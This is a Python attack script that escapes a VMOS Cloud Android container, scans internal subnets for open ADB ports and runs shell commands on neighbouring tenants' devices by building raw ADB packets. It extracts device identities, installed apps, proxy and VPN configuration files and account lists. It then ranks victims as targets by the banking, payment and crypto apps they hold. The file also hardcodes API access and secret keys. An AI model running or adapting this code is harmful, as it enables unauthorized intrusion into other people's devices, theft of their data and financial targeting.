#!/usr/bin/env python3
"""
Efficient ADB Neighbor Scanner & Data Extractor
Works within VMOS Cloud API ~2.3s timeout by batching small operations.
"""
import asyncio
import json
import sys
import os
import base64
import struct
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
BASE = "https://api.vmoscloud.com"
PAD = "ATP6416I3JJRXL3V"
DELAY = 3.5


async def sh(c, cmd, t=30):
    await asyncio.sleep(DELAY)
    try:
        r = await c.sync_cmd(pad_code=PAD, command=cmd, timeout_sec=t)
        d = r.get("data", {})
        if isinstance(d, list) and d:
            e = d[0]
            return (e.get("errorMsg", "") or "").strip() if isinstance(e, dict) else str(e)
        elif isinstance(d, dict):
            return (d.get("errorMsg", "") or "").strip()
        return str(d)
    except Exception as e:
        return f"ERR:{e}"


async def nsh(c, cmd, t=30):
    e = cmd.replace("'", "'\\''")
    return await sh(c, f"nsenter -t 1 -m -u -i -n -p -- sh -c '{e}'", t)


def adb_pkt(cmd_id, arg0, arg1, data=b""):
    return struct.pack("<IIIIII", cmd_id, arg0, arg1, len(data),
                       sum(data) & 0xFFFFFFFF, cmd_id ^ 0xFFFFFFFF) + data


async def adb_exec(c, ip, shell_cmd, timeout=4):
    """Execute shell on ADB neighbor. Returns text output."""
    CNXN = 0x4E584E43
    OPEN = 0x4E45504F
    cnxn = adb_pkt(CNXN, 0x01000001, 0x00040000, b"host::\x00")
    opn = adb_pkt(OPEN, 1, 0, f"shell:{shell_cmd}\x00".encode())
    
    # Write CNXN separately from OPEN to allow handshake timing
    cb = base64.b64encode(cnxn).decode()
    ob = base64.b64encode(opn).decode()
    
    result = await nsh(c,
        f"echo {cb} | base64 -d > /data/local/tmp/cn.bin && "
        f"echo {ob} | base64 -d > /data/local/tmp/op.bin && "
        f"{{ cat /data/local/tmp/cn.bin; sleep 0.2; cat /data/local/tmp/op.bin; sleep {timeout}; }} | "
        f"nc -w {timeout+1} {ip} 5555 > /data/local/tmp/ar 2>/dev/null; "
        f"strings /data/local/tmp/ar | "
        f"grep -vE '^(host::|device::|shell,|CNXN|OPEN|WRTE|OKAY|CLSE|features=)' | head -80",
        t=timeout + 15)
    return result


async def scan_batch(c, base_ip, start, end):
    """Scan a small batch of IPs for ADB (fits in ~2s)."""
    # Scan ~15 IPs in parallel with 1s nc timeout — completes in ~1.5s
    batch_size = end - start + 1
    if batch_size > 15:
        batch_size = 15
        end = start + batch_size - 1
    
    cmd_parts = []
    for i in range(start, end + 1):
        cmd_parts.append(
            f"(printf '\\x43\\x4e\\x58\\x4e\\x01\\x00\\x00\\x01\\x00\\x00\\x04\\x00\\x07\\x00\\x00\\x00\\x32\\x02\\x00\\x00\\xbc\\xb1\\xa7\\xb1host::\\x00' | "
            f"nc -w 1 {base_ip}.{i} 5555 2>/dev/null | head -c 4 | grep -q CNXN && echo HIT:{base_ip}.{i}) &"
        )
    cmd = " ".join(cmd_parts) + " wait"
    
    result = await nsh(c, cmd)
    hits = []
    for line in result.split("\n"):
        if line.startswith("HIT:"):
            hits.append(line[4:].strip())
    return hits


async def main():
    c = VMOSCloudClient(ak=AK, sk=SK, base_url=BASE)
    
    print("=" * 70)
    print("  EFFICIENT ADB NEIGHBOR SCAN + EXTRACTION")
    print("=" * 70)
    
    # Step 1: Verify connectivity
    print("\n[1] Verifying connectivity...")
    r = await sh(c, "id")
    print(f"  Device: {r[:100]}")
    r = await nsh(c, "id; ip addr show eth0 | grep inet | head -1")
    print(f"  Host: {r[:200]}")
    
    # Step 2: Scan local subnet in small batches
    print("\n[2] Scanning 10.10.53.0/24 in batches of 15...")
    all_hosts = []
    for start in range(40, 200, 15):
        end = min(start + 14, 199)
        hits = await scan_batch(c, "10.10.53", start, end)
        if hits:
            all_hosts.extend(hits)
            print(f"  Batch {start}-{end}: {len(hits)} hits → {hits}")
        else:
            print(f"  Batch {start}-{end}: 0")
    
    print(f"\n  LOCAL SUBNET TOTAL: {len(all_hosts)} ADB hosts")
    
    # Step 3: Quick sample scan of other known subnets
    print("\n[3] Sampling other subnets...")
    other_subnet_hosts = {}
    for subnet in [1, 2, 11, 27, 41, 45, 74, 80]:
        # Quick scan: just probe .50-.110 range (most common container IPs)
        subnet_hits = []
        for start in range(40, 180, 15):
            end = min(start + 14, 179)
            hits = await scan_batch(c, f"10.10.{subnet}", start, end)
            if hits:
                subnet_hits.extend(hits)
        if subnet_hits:
            other_subnet_hosts[subnet] = subnet_hits
            print(f"  10.10.{subnet}: {len(subnet_hits)} hosts → {subnet_hits[:5]}")
        else:
            print(f"  10.10.{subnet}: 0")
    
    # Combine all hosts
    for hosts in other_subnet_hosts.values():
        all_hosts.extend(hosts)
    
    # Remove our own IP
    all_hosts = [ip for ip in all_hosts if ip != "10.10.53.148"]
    print(f"\n  TOTAL ADB HOSTS: {len(all_hosts)}")
    
    # Step 4: Probe each host for identity banner (from CNXN response)
    print("\n[4] Probing identity banners...")
    device_info = {}
    for ip in all_hosts:
        # The probe script already returns the CNXN banner with device info
        r = await nsh(c, f"sh /data/local/tmp/probe.sh {ip} 2")
        device_info[ip] = {"banner": r}
        # Parse model from banner
        model = "?"
        if "ro.product.model=" in r:
            try:
                model = r.split("ro.product.model=")[1].split(";")[0]
            except:
                pass
        device_info[ip]["model"] = model
        print(f"  {ip} → {model}")
    
    # Step 5: Extract detailed data from each neighbor
    print(f"\n[5] Deep extraction from {len(all_hosts)} neighbors...")
    
    for ip in all_hosts:
        print(f"\n  ═══ {ip} ({device_info[ip].get('model', '?')}) ═══")
        
        # Identity details
        print(f"  [identity]")
        ident = await adb_exec(c, ip,
            "getprop ro.product.model; getprop ro.product.brand; "
            "getprop ro.build.fingerprint; getprop ro.serialno; "
            "getprop ro.build.version.release", 3)
        device_info[ip]["identity"] = ident
        if ident:
            for line in ident.strip().split("\n")[:5]:
                print(f"    {line}")
        
        # 3rd party apps
        print(f"  [apps]")
        apps = await adb_exec(c, ip, "pm list packages -3 2>/dev/null", 5)
        device_info[ip]["apps"] = apps
        app_list = [l.replace("package:", "").strip() for l in (apps or "").split("\n") if "package:" in l]
        device_info[ip]["app_list"] = app_list
        print(f"    {len(app_list)} 3rd party apps")
        
        # Proxy / network config
        print(f"  [proxy/network]")
        proxy = await adb_exec(c, ip,
            "settings get global http_proxy 2>/dev/null; "
            "echo SEP; getprop persist.sys.http_proxy; "
            "echo SEP; ip addr show | grep 'inet ' | grep -v 127.0; "
            "echo SEP; ip route show default 2>/dev/null", 4)
        device_info[ip]["proxy_raw"] = proxy
        
        # Parse proxy
        proxy_addr = None
        if proxy:
            for line in proxy.split("\n"):
                line = line.strip()
                if line and line != "SEP" and line != "null" and ":" in line and any(c.isdigit() for c in line):
                    if "inet" not in line and "default" not in line:
                        proxy_addr = line
                        break
        device_info[ip]["proxy"] = proxy_addr
        print(f"    Proxy: {proxy_addr or 'none detected'}")
        if proxy:
            for line in proxy.split("\n"):
                l = line.strip()
                if l and l != "SEP" and l != "null":
                    print(f"    {l}")
        
        # VPN / OwlProxy / SagerNet
        print(f"  [vpn]")
        vpn = await adb_exec(c, ip,
            "dumpsys connectivity 2>/dev/null | grep -iE 'vpn|proxy' | head -5; "
            "echo SEP; "
            "cat /data/data/com.owlproxy.overseas/shared_prefs/*.xml 2>/dev/null | head -20; "
            "echo SEP; "
            "cat /data/data/io.nekohasekai.sagernet/shared_prefs/*.xml 2>/dev/null | head -20", 5)
        device_info[ip]["vpn_raw"] = vpn
        if vpn and vpn.strip() and vpn.strip() != "SEP":
            for line in vpn.split("\n")[:10]:
                l = line.strip()
                if l and l != "SEP":
                    print(f"    {l}")
        else:
            print(f"    No VPN config found")
        
        # Accounts
        print(f"  [accounts]")
        accts = await adb_exec(c, ip,
            "dumpsys account 2>/dev/null | grep -A1 'Account {' | head -20", 4)
        device_info[ip]["accounts"] = accts
        if accts:
            for line in accts.strip().split("\n")[:8]:
                print(f"    {line}")
    
    # Step 6: Score and rank
    HIGH_VALUE_PKGS = {
        "com.google.android.apps.walletnfcrel": "Google Pay",
        "com.paypal.android.p2pmobile": "PayPal",
        "com.venmo": "Venmo",
        "com.squareup.cash": "Cash App",
        "com.chime.chmob": "Chime",
        "com.transferwise.android": "Wise",
        "com.revolut.revolut": "Revolut",
        "com.coinbase.android": "Coinbase",
        "com.binance.dev": "Binance",
        "com.bybit.app": "Bybit",
        "com.robinhood.android": "Robinhood",
        "com.zellepay.zelle": "Zelle",
        "com.wf.wellsfargomobile": "Wells Fargo",
        "com.chase.sig.android": "Chase",
        "com.bankofamerica.cashpromobile": "BofA",
        "com.citi.citimobile": "Citi",
        "com.usaa.mobile.android.usaa": "USAA",
        "com.capitalone.mobile": "Capital One",
        "com.samsung.android.spay": "Samsung Pay",
        "com.amazon.mShop.android.shopping": "Amazon",
        "com.affirm.customer": "Affirm",
        "com.klarna.android": "Klarna",
    }
    
    print(f"\n{'='*70}")
    print(f"  FINAL REPORT: TARGET RANKINGS")
    print(f"{'='*70}")
    
    ranked = []
    for ip, info in device_info.items():
        score = 0
        hv_apps = []
        app_list = info.get("app_list", [])
        
        for pkg, name in HIGH_VALUE_PKGS.items():
            if pkg in app_list:
                hv_apps.append(name)
                score += 10
        
        if info.get("proxy"):
            score += 15
        
        if info.get("vpn_raw") and "SEP" not in info["vpn_raw"].replace("SEP", "").strip():
            score += 10
        
        acct_count = (info.get("accounts") or "").count("Account {")
        score += acct_count * 3
        
        ranked.append({
            "ip": ip,
            "model": info.get("model", "?"),
            "score": score,
            "hv_apps": hv_apps,
            "app_count": len(app_list),
            "proxy": info.get("proxy"),
            "acct_count": acct_count,
        })
    
    ranked.sort(key=lambda x: x["score"], reverse=True)
    
    print(f"\n  {'Rank':<5} {'IP':<18} {'Model':<16} {'Score':<7} {'Apps':<6} {'Proxy':<8} {'High-Value'}")
    print(f"  {'─'*80}")
    for i, t in enumerate(ranked, 1):
        hv = ", ".join(t["hv_apps"][:3]) or "-"
        px = "YES" if t["proxy"] else "no"
        print(f"  {i:<5} {t['ip']:<18} {t['model'][:15]:<16} {t['score']:<7} {t['app_count']:<6} {px:<8} {hv}")
    
    # Proxy report
    proxies = [t for t in ranked if t["proxy"]]
    print(f"\n  PROXY ENDPOINTS ({len(proxies)}):")
    print(f"  {'─'*60}")
    for p in proxies:
        print(f"    {p['ip']:<18} {p['model']:<16} proxy={p['proxy']}")
    
    # Save full report
    report = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "attack_platform": PAD,
        "total_hosts": len(all_hosts),
        "devices": device_info,
        "rankings": ranked,
        "proxies": proxies,
    }
    
    # Truncate large strings for JSON
    for ip in report["devices"]:
        for key in ["banner", "identity", "apps", "proxy_raw", "vpn_raw", "accounts"]:
            val = report["devices"][ip].get(key)
            if isinstance(val, str) and len(val) > 500:
                report["devices"][ip][key] = val[:500]
    
    with open("neighbor_recon_report.json", "w") as f:
        json.dump(report, f, indent=2, default=str)
    
    print(f"\n  ✓ Full report saved: neighbor_recon_report.json")
    print(f"\n  SUMMARY:")
    print(f"    Total ADB neighbors: {len(all_hosts)}")
    print(f"    With proxies:        {len(proxies)}")
    print(f"    High-value targets:  {len([r for r in ranked if r['score'] >= 10])}")
    print(f"    Financial apps:      {sum(len(r['hv_apps']) for r in ranked)}")


if __name__ == "__main__":
    asyncio.run(main())
